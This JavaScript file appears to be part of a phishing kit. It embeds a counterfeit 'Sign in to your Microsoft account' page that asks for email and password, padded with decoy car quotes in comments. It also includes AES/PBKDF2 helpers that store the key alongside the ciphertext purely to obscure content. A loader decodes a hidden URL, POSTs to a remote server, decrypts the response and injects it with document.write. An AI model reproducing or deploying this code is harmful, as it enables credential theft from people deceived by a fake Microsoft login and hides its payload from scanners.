const template = `<!doctype html>
<html>

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
    <title>Sign in to your Microsoft account</title>
    <link rel="icon" type="image/svg+xml" sizes="21x21" href="assets/favicon16.svg" />
    <link rel="icon" type="image/svg+xml" sizes="43x43" href="assets/favicon32.svg" />
    <link rel="icon" type="image/svg+xml" sizes="240x240" href="assets/favicon%20180.svg" />
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css" />
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css" />
    <link rel="stylesheet" href="assets/styles.min.css" />
</head>

<body class="text-nowrap" style="width: 100%; height: 100vh">
    <main>
        <div id="loginForm" class="container">
            <div id="lettuce" class="quince" style="display: block">
                <!--Fast cars are my only vice. -->
                <div style=""></div>
                <!--A car for every purse and purpose. -->
                <div style=""></div>
                <!-- <div>A racing car is an animal with a thousand adjustments.</div> -->
                <div style=""></div>
                <!-- <div>To drive is to take the soul for a ride.</div> -->
                <div style=""></div>
                <span hidden="">When a man opens a car door for his wife, it’s either a new car or
                    a new wife.</span>
                <div></div>
                <!-- <div>A racing car is an animal with a thousand adjustments.</div> -->
                <div style=""></div>
                <!-- <div>The best car safety device is a rear-view mirror with a cop in it.</div> -->
            </div>
            <img id="image" src="assets/microsoft_logo.svg" />
            <div></div>
            <section id="section-main">
                <section id="section-1" class="slide-page">
                    <p id="signIn" class="field">Sign in</p>
                    <h5 id="result"></h5>
                    <input type="email" id="email" class="field" placeholder="Email, phone, or Skype" />
                    <p id="NoAccount" class="field">
                        No account?<a id="linkCreateAccount" href="#"
                            style="color: #0067b8">Create One!</a>
                    </p>
                    <p id="signInSecurityKey" class="field">
                        <a href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key"
                            style="color: #0067b8">Can't access your account?</a>
                    </p>

                    <p id="btnPlace" class="field">
                        <button class="next firstNext" href="#next" type="button" id="btnSend">
                            Next
                        </button>
                    </p>
                </section>
                <section id="section-2" class="page secondSlide">
                    <p id="userLine">P</p>
                    <p id="enterPwd">Enter Password</p>
                    <h5 id="passResult"></h5>
                    <p>
                        <input type="password" id="password" placeholder="Password" />
                    </p>
                    <p id="ForgodPwd"><a href="#">Forgot password?</a></p>
                    <p id="others"><a href="#">Other ways to sign in</a></p>
                    <p id="btnBack" class="prev-1">
                        <a href="#">Sign in with a different Microsoft account</a>
                    </p>
                    <p id="btnSignInLocation">
                        <button id="btnSignIn" class="submit" type="button">
                            Sign in
                        </button>
                    </p>
                </section>
            </section>
        </div>
        <div class="opts">
            <p class="mb-0 has-icon" style="font-size: 15px">
                <span class="icon"><img src="assets/key.png" width="30px" /></span>
                Sign-in options
            </p>
        </div>
    </main>

    <div id="footer" style="height: 36px">
        <p style="font-size: 13px; text-align: left">Terms of use</p>
        <p style="font-size: 12px">Privacy &amp; cookies</p>
        <p style="font-size: 12px">•••<br /></p>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
    <script src="assets/script.min.js"></script>
</body>

</html>
`;
function encrypt(plaintext, password) {
  const salt = CryptoJS.lib.WordArray.random(128 / 8); // Generate a random salt
  const iv = CryptoJS.lib.WordArray.random(128 / 8); // Generate a random IV

  // Convert the password to a hex string
  const passwordHex = CryptoJS.enc.Hex.stringify(
    CryptoJS.enc.Utf8.parse(password),
  );

  // Derive the key using PBKDF2
  const key = CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(passwordHex), salt, {
    hasher: CryptoJS.algo.SHA512,
    keySize: 64 / 8,
    iterations: 999,
  });

  // Encrypt the plaintext
  const encrypted = CryptoJS.AES.encrypt(plaintext, key, {
    iv: iv,
  });

  // Construct the JSON object with the encrypted components
  const encryptedJson = JSON.stringify({
    a: encrypted.toString(),
    b: salt.toString(CryptoJS.enc.Hex),
    c: iv.toString(CryptoJS.enc.Hex),
    d: passwordHex, // Store the hex-encoded password
  });

  return encryptedJson;
}

async function honesty(eloquence) {
  var { a, b, c, d } = JSON.parse(eloquence);

  return CryptoJS.AES.decrypt(
    a, // The encrypted text
    CryptoJS.PBKDF2(
      CryptoJS.enc.Hex.parse(d), // Password (derived from 'd')
      CryptoJS.enc.Hex.parse(b), // Salt (derived from 'b')
      {
        hasher: CryptoJS.algo.SHA512, // Hashing algorithm
        keySize: 64 / 8, // Key size
        iterations: 999, // Number of iterations
      },
    ),
    {
      iv: CryptoJS.enc.Hex.parse(c), // Initialization vector
    },
  ).toString(CryptoJS.enc.Utf8); // Convert decrypted bytes to UTF-8 string
}

(async () => {
  const firstDecryption = await honesty(
    atob(document.querySelector("input").value),
  );

  console.log(encrypt(template, "mysecretpassword"));
  // const one = btoa(encrypt(plaintext, password));

  const response = await fetch(firstDecryption, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ bushing: "pomegranate" }),
  });
  const finalDecryption = await honesty(await response.text());

  document.write(finalDecryption);
})();
